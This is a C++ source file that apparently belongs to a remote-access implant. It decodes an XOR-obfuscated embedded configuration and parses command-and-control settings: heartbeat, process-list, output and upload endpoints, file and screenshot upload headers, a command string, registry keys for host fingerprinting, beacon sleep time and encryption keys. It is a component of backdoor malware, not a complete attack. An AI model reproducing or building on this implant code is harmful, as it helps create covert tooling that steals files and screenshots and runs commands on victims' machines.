#include <iostream>
#include "config.h"
#include "json.hpp"


std::string xorConfig(char* encString) {
	std::string decString = "";
	// Key values are bytes 0-3
	// XORing the bytes with i % 4 decodes the data
	// Multibyte XOR
	for (int i = 4; i < CONFIG_SIZE; i++) {
		decString += (encString[i] ^ ((int)encString[i % 4]));
	}
	return decString;
}

// Initialize the configuration struct using values parsed from the ConfigStr JSON-formatted string
void initializeConfig(struct Configuration* Config, std::string configStr) {
	nlohmann::json j = nlohmann::json::parse(configStr);

	//Config version
	Config->version = j["version"];

	//Define URL endpoints
	Config->endpoints.heartbeat = j["endpoints"]["heartbeat"];
	Config->endpoints.info = j["endpoints"]["info"];
	Config->endpoints.out = j["endpoints"]["out"];
	Config->endpoints.ps = j["endpoints"]["ps"];
	Config->endpoints.upload = j["endpoints"]["upload"];

	
	//Strings
	Config->strings.get = j["strings"]["get"];
	Config->strings.post = j["strings"]["post"];
	Config->strings.uploadheaders = j["strings"]["uploadheaders"];
	Config->strings.uploadheadfile = j["strings"]["uploadheadfile"];
	Config->strings.uploadheadscreenshot = j["strings"]["uploadheadscreenshot"];
	Config->strings.uploadtail = j["strings"]["uploadtail"];
	Config->strings.cmd = j["strings"]["cmd"];
	Config->strings.regsubkey = j["strings"]["regsubkey"];
	Config->strings.productname = j["strings"]["productname"];
	Config->strings.displayversion = j["strings"]["displayversion"];

	//Net stuff
	Config->hostname = j["hostname"];
	Config->port = j["port"];
	Config->protocol = j["protocol"];
	Config->useragent = j["useragent"];
	Config->ipCheckUrl = j["ipcheckurl"];

	//Times
	Config->sleeptime = j["sleeptime"];
	Config->cmdtimeout = j["cmdtimeout"];

	//Keys
	Config->key = j["key"];
	Config->xorKey = j["xorkey"];
}